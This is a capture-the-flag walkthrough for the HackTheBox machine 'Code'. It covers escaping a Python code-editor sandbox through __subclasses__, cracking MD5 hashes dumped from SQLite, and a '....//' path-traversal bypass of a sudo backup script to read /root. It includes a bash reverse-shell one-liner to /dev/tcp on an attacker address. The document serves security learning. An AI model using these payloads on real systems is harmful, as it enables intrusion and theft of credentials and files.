---
title: Code
published: 2025-03-23
description: "Code is an easy Linux machine that demonstrates a Python Jail / Sandbox escape and privilege escalation from backy program."
image: /banner/Code.png
tags: [Linux, Easy, Pyjail]
category: "HackTheBox"
draft: false
lang: "en"
---

# Description

Code is an easy Linux machine that demonstrates a Python Jail / Sandbox escape and privilege escalation from backy program.

# Recon

## nmap

Result of `nmap` scan :

```bash
# Nmap 7.95 scan initiated Sun Mar 23 03:32:57 2025 as: nmap -vvv -p- -4 -sSCV -oN all_tcp_scan.txt 10.10.11.62
Nmap scan report for 10.10.11.62 (10.10.11.62)
Host is up, received echo-reply ttl 63 (0.033s latency).
Scanned at 2025-03-23 03:32:58 WIB for 11s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports are open, `22` and `5000`.

# 5000 - TCP

Visiting the website, it shows a python code editor. We can run a python code without logging in. Unfortunately, it's blacklisting keyword that could be used for a malicous purpose.<br> So we need to find a way to call a malicous python code without using keyword like `import`, `eval`, `exec`, etc. After trying a lot of payloads, I found a way to execute system command using `subclasses` because we are using a index to select `subprocessing.Popen` function.

```python
# Find an index for subprocessing.Popen
print("".__class__.__base__.__subclasses__())

# I found it at index 317
"".__class__.__base__.__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/10.10.x.x/9001 0>&1'", shell=True)
```

# Shell as app-production

## User flag

```bash
app-production@code:~$ cat user.txt
cat user.txt
deadbeef33b9a3595c1257124909fake
```

## Enumeration

I found `database.db` file at `/home/app-production/app/instance/database.db` path. Because it's a SQLite database, we can just dump it using `strings` command. <br>
You will found `development` and `martin` user's password hash, the hash itself is `MD5`.
`hashes.txt`

```bash
development:<hash>
martin:<hash>
```

```bash
hashcat hashes.txt -m 0 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --username
```

Both users' password should be cracked. I will use `martin` credentials because this is a linux user.

```bash
ssh martin@10.10.11.62
```

# Shell as martin

## Sudo

This user can run `/usr/bin/backy.sh` command as all users.

```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

The script is a wrapper for `/usr/bin/backy` binary with additional checks.

```bash
martin@code:~$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

It makes sure that the `directories_to_archive` are under `/var/` and `/home/` only, but we can still try to use `../` and see what happens. You can grab a example JSON file at `/home/martin/backups/task.json` path. Let's try to use `/home/../root` as the `directories_to_archive` value and remove the `exclude` property.
`task.json`

```json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/../root"
        ]
}
```

```bash
martin@code:/tmp/.test$ sudo /usr/bin/backy.sh task.json
2025/03/23 15:34:11 🍀 backy 1.2
2025/03/23 15:34:11 📋 Working with task.json ...
2025/03/23 15:34:11 💤 Nothing to sync
2025/03/23 15:34:11 📤 Archiving: [/home/root]
2025/03/23 15:34:11 📥 To: /home/martin/backups ...
2025/03/23 15:34:11 📦
2025/03/23 15:34:11 💢 Archiving failed for: /home/root
2025/03/23 15:34:11 ❗ Archiving completed with errors
```

Unfortunately, it strips the `../` from the path. Let's try to split the `../` with another `../` so that when it's stripped, it will become `../`
`task.json`

```json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/....//root"
        ]
}
```

```bash
martin@code:/tmp/.test$ sudo /usr/bin/backy.sh task.json
2025/03/23 15:37:26 🍀 backy 1.2
2025/03/23 15:37:26 📋 Working with task.json ...
2025/03/23 15:37:26 💤 Nothing to sync
2025/03/23 15:37:26 📤 Archiving: [/home/../root]
2025/03/23 15:37:26 📥 To: /home/martin/backups ...
2025/03/23 15:37:26 📦
martin@code:/tmp/.test$ ls /home/martin/backups/
code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_March.tar.bz2  task.json
```

As you can see, it's working as expected. We can just extract the archive to get the root flag. If you want to spawn a shell as `root` user, you get the private SSH key.

```bash
tar jxf code_home_.._root_2025_March.tar.bz2
```

## Root flag

```bash
martin@code:~/backups/root$ cat root.txt
deadbeef9b35270dbebef1eb6c8cfake
```
